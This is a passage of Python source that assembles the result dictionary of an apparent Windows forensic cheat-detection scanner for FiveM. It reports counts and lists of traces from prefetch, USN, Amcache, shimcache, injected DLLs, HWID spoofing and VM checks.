            "uuid_traces_count"       : len(uuid_traces),
            "eventlog_svc_traces_count": len(eventlog_svc_traces),
            "conhost_traces_count"    : len(conhost_traces),
            "cleaner_effects_count"   : len(cleaner_result.get("findings", [])),
            "hwid_spoof_detected"     : hwid_crosscheck.get("spoof_detected", False),
            "drives_scanned"          : len(mounted_drives),
            "shimcache_traces_count"  : len(shimcache_traces),
            "mft_traces_count"        : len(mft_traces),
            "entropy_traces_count"    : len(entropy_traces)
        },
        "fivem_suspects"   : fivem_suspects,
        "prefetch_traces"  : prefetch_traces,
        "usn_traces"       : usn_traces,
        "defender_traces"  : defender_traces,
        "bam_traces"       : bam_traces,
        "userassist_traces": ua_traces,
        "usb_history"      : usb_history,
        "amcache_traces"      : amcache_traces,
        "network_traces"      : network_traces,
        "injected_dll_traces" : injected_dll_traces,
        "uuid_traces"         : uuid_traces,
        "eventlog_svc_traces" : eventlog_svc_traces,
        "conhost_traces"      : conhost_traces,
        "hwid_crosscheck"     : hwid_crosscheck,
        "cleaner_effects"     : cleaner_result.get("findings", []),
        "shimcache_traces"     : shimcache_traces,
        "mft_traces"          : mft_traces,
        "entropy_traces"      : entropy_traces,
        "vm_sandbox"          : vm_sandbox_result,
        "risk_summary"        : risk_summary,
        "applications"     : applications
    }
